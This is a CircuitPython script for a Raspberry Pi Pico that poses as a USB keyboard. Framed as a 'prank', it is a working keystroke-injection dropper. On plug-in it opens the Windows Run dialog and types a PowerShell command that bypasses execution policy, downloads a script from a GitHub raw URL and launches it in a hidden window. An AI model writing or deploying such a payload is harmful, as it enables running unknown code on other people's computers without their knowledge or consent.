# code.py  (CircuitPython on Pico)
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# -----------------------------------------------
# CONFIGURATION
# -----------------------------------------------
RAW_URL = "https://raw.githubusercontent.com/yourusername/PranksRepo/main/prank.ps1"
SAVE_PATH = r"C:\Users\Public\prank.ps1"   # Where to save the downloaded script
DELAY_BEFORE_START = 2    # Seconds to wait after plug-in
# -----------------------------------------------

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

def fast_type(text, char_delay=0.01):
    for c in text:
        layout.write(c)
        time.sleep(char_delay)

time.sleep(DELAY_BEFORE_START)  # Give Windows time to enumerate

# 1) Open Win+R to run PowerShell (to download the script):
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(0.5)

# Build a single-line PowerShell command that:
#  • uses Invoke-WebRequest to fetch RAW_URL → SAVE_PATH
#  • then starts that file in hidden mode
ps_cmd = (
    f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command '
    f'"Invoke-WebRequest -Uri \\"{RAW_URL}\\" -OutFile \\"{SAVE_PATH}\\"; '
    f'Start-Process -FilePath \\"powershell.exe\\" -ArgumentList '
    f'\\"-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File {SAVE_PATH}\\""'
)

# Type that full command into the Run dialog
fast_type(ps_cmd)
time.sleep(0.2)
kbd.send(Keycode.ENTER)

# 2) Prevent any further keystrokes
while True:
    time.sleep(1)
